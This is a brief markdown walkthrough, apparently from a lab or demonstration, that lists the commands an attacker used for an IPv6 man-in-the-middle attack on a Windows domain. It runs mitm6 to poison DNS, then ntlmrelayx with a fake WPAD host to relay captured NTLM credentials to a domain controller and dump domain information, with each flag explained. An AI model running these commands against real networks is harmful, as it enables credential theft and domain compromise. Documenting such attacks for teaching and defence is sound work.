## IPv6 ATTACK COMMANDS

The following are the commands the attacker used while carrying out this attack:

### Run the mitm6 attack tool

Run the mitm6 attack tool with the parameters: -i = Interface of attack machine that is conencted to the victim network i.e.eth1, -d = domain name of the victim clients i.e. mydomain.com

***sudo mitm6 -i eth1 -d mydomain.com***

### Run the ntlmreplayx tool 

The command below runs the ntlmrelayx tool and does a couple of things due to the following parameters:
 - '-6' - Specify that we are target the IPv6 protocol
 - '-t' - The target to which we will relay the captured credentials
 - '-wh' - Serves the fake wpad file that the victim will attempt to access thus authenticating to the attacker machine via NTLM challenge/response mechanism. This leds to the credential capture
 - '-l' - The folder to which the captured domain information will be written to.

 ***ntlmreplayx.py -6 -t ldaps://domaincontrollerIP -wh fakewpad.mydomain.com -l lootme***

 ###

 ***firefox domain_users_by_group.html***

 ###

 ***